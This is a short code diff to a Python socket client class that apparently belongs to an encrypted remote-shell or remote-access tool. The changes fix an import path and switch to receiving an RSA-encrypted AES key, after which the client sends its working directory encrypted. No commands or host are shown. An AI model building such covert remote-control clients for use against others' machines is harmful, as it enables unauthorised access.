@@ -2,7 +2,7 @@ import os
 import socket
 import subprocess
 from threading import Thread
-from bin.helper_methods import *
+from helper_methods import *
 
 
 class Client(Thread):
@@ -22,7 +22,7 @@ class Client(Thread):
         while True:
             try:
                 AES_KEY = self.conn.recv(1024)
-                self.AES_KEY = AESFunc_client(AES_KEY).encode('ISO-8859-1', errors='ignore')
+                self.AES_KEY = RSAFunc_client(AES_KEY).encode('ISO-8859-1', errors='ignore') # Receiving the AES key encrypted in RSA.
                 res = encrypt_client(os.getcwd().encode('ISO-8859-1', errors='ignore'), self.AES_KEY)
                 self.conn.send(res)
                 break
